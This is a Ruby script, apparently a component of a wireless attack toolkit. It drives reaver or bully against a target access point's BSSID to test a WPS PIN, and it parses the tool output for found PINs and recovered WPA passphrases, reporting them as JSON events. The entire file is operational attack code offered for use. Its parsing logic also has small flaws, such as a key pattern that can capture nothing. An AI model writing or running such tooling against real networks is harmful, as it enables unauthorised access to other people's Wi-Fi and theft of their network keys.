#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'open3'

def wps_pin_valid?(pin)
  digits = pin.to_s.gsub(/\D/, '').chars.map(&:to_i)
  return false unless digits.size == 8
  sum = 3 * (digits[0] + digits[2] + digits[4] + digits[6]) +
        digits[1] + digits[3] + digits[5]
  sum % 10 == digits[7]
end

def compute_checksum(pin7)
  digits = pin7.to_s.gsub(/\D/, '').chars.map(&:to_i)
  return nil unless digits.size == 7
  sum = 3 * (digits[0] + digits[2] + digits[4] + digits[6]) +
        digits[1] + digits[3] + digits[5]
  sum % 10
end

def run_reaver(bssid, iface, pin)
  cmd = ['reaver', '-i', iface, '-b', bssid, '-p', pin,
         '-vv', '-N', '-L', '--no-associate']
  run_tool('reaver', cmd, bssid, iface)
end

def run_bully(bssid, iface, pin)
  cmd = ['bully', '-i', iface, '-b', bssid, '-p', pin, '-v', '3']
  run_tool('bully', cmd, bssid, iface)
end

def run_tool(name, cmd, bssid, iface)
  output = []
  pin_found = nil
  psk = nil
  lockout = false

  Open3.popen3(*cmd) do |stdin, stdout, stderr, thread|
    stdin.close
    readers = [stdout, stderr]
    until readers.empty?
      ready = IO.select(readers, nil, nil, 0.5)
      if ready
        ready[0].each do |r|
          begin
            line = r.gets
            if line
              line.force_encoding('UTF-8')
              output << line
              parse_line(line, name, bssid, iface, ->(h) { puts JSON.generate(h); $stdout.flush },
                         -> { lockout = true },
                         ->(p, k) { pin_found = p; psk = k })
            else
              readers.delete(r)
            end
          rescue Errno::EINTR
            next
          end
        end
      end
    end
    thread.join
  end

  { pin: pin_found, psk: psk, lockout: lockout, output: output.join("\n") }
end

def parse_line(line, tool, bssid, iface, emit, on_lockout, on_success)
  data = { tool: tool, line: line.strip }

  if line.match?(/WPS\s+lockout|lockout\s+detected/i)
    on_lockout&.call
    emit.call({ event: 'wps_lockout', iface: iface, bssid: bssid,
                ssid: '', channel: 0, data: data, timestamp: Time.now.iso8601 })
  end

  if line =~ /[Tt]rying\s+[Pp]in\s*[:#]?\s*(\d{4,8})/
    emit.call({ event: 'wps_pin_attempt', iface: iface, bssid: bssid,
                ssid: '', channel: 0, data: data.merge(pin: $1),
                timestamp: Time.now.iso8601 })
  end

  if line =~ /WPS\s+[Pp]in\s*[:#]?\s*(\d{4,8})\s*$/
    on_success&.call($1, nil)
    emit.call({ event: 'wps_pin_found', iface: iface, bssid: bssid,
                ssid: '', channel: 0, data: data.merge(pin: $1),
                timestamp: Time.now.iso8601 })
  end

  if line =~ /[Pp]in\s*(?:=|:)?\s*(\d{4,8})\s*$/
    on_success&.call($1, nil)
    emit.call({ event: 'wps_pin_found', iface: iface, bssid: bssid,
                ssid: '', channel: 0, data: data.merge(pin: $1),
                timestamp: Time.now.iso8601 })
  end

  if line =~ /WPA\s*PSK|Key\s*["']?([^\s"']{8,})["']?/
    key = $1
    on_success&.call(nil, key) unless key.nil?
    emit.call({ event: 'wps_psk_found', iface: iface, bssid: bssid,
                ssid: '', channel: 0, data: data.merge(psk: key),
                timestamp: Time.now.iso8601 })
  end

  if line =~ /(\d+\.\d+)%\s*complete/ || line =~ /Progress:\s*(\d+)/
    pct = $1
    emit.call({ event: 'wps_progress', iface: iface, bssid: bssid,
                ssid: '', channel: 0, data: data.merge(progress: pct.to_f),
                timestamp: Time.now.iso8601 })
  end
end

begin
  bssid = ARGV[0]
  iface = ARGV[1]
  pin = ARGV[2]

  raise 'usage: wps_attack.rb <bssid> <interface> [pin]' unless bssid && iface

  if pin && !wps_pin_valid?(pin)
    puts JSON.generate({ event: 'wps_pin_invalid', iface: iface, bssid: bssid,
      ssid: '', channel: 0, data: { pin: pin },
      timestamp: Time.now.iso8601 })
    exit 1
  end

  puts JSON.generate({ event: 'wps_start', iface: iface, bssid: bssid,
    ssid: '', channel: 0,
    data: { pin: pin, checksum_valid: pin ? wps_pin_valid?(pin) : nil },
    timestamp: Time.now.iso8601 })
  $stdout.flush

  reaver_path = `which reaver 2>/dev/null`.strip
  bully_path = `which bully 2>/dev/null`.strip

  unless reaver_path.empty? || bully_path.empty?
    puts JSON.generate({ event: 'wps_info', iface: iface, bssid: bssid,
      ssid: '', channel: 0,
      data: { reaver: !reaver_path.empty?, bully: !bully_path.empty? },
      timestamp: Time.now.iso8601 })
    $stdout.flush
  end

  result = if pin
    if !reaver_path.empty?
      run_reaver(bssid, iface, pin)
    elsif !bully_path.empty?
      run_bully(bssid, iface, pin)
    else
      raise 'neither reaver nor bully found in PATH'
    end
  else
    raise 'no PIN provided and bruteforce not implemented'
  end

  puts JSON.generate({ event: 'wps_result', iface: iface, bssid: bssid,
    ssid: '', channel: 0,
    data: { pin: result[:pin], psk: result[:psk],
            lockout: result[:lockout] },
    timestamp: Time.now.iso8601 })
  $stdout.flush

rescue Interrupt
  puts JSON.generate({ event: 'wps_interrupted', iface: iface || '',
    bssid: bssid || '', ssid: '', channel: 0, data: {},
    timestamp: Time.now.iso8601 })
rescue => e
  $stderr.puts JSON.generate({ event: 'error', data: { message: e.message,
    backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601 })
  exit 1
end
